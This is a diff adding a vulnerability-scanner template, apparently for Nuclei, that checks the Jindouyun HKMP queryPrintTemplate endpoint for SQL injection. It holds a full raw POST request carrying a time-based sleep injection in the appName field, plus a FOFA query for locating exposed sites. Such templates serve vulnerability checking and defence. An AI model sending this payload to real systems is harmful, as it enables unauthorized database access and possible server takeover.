@@ -1,0 +1,35 @@
+id: HKMP-sql
+
+info:
+  name: 金斗云 HKMP智慧商业软件 queryPrintTemplate SQL注入漏洞复现
+  author: yichen
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the queryPrintTemplate interface of Jindouyun HKMP intelligent business software. Unauthenticated remote attackers can exploit the vulnerability to obtain information in the database (such as administrator backend passwords, site user personal information), and even write trojans to the server in high privilege situations, further obtaining server system privileges.
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/141233761?spm=1001.2014.3001.5502
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="金斗云 Copyright"
+  tags: HKMP,sqli
+
+http:
+  - raw:
+      - |
+        POST /admin/configApp/queryPrintTemplate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/json
+        Content-Length: 232
+
+        {"appId":"hkmp","data":{"appName":"悟空POS Win版' AND (SELECT 5 from (select(sleep(5)))x) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"4000") && status_code == 200
+
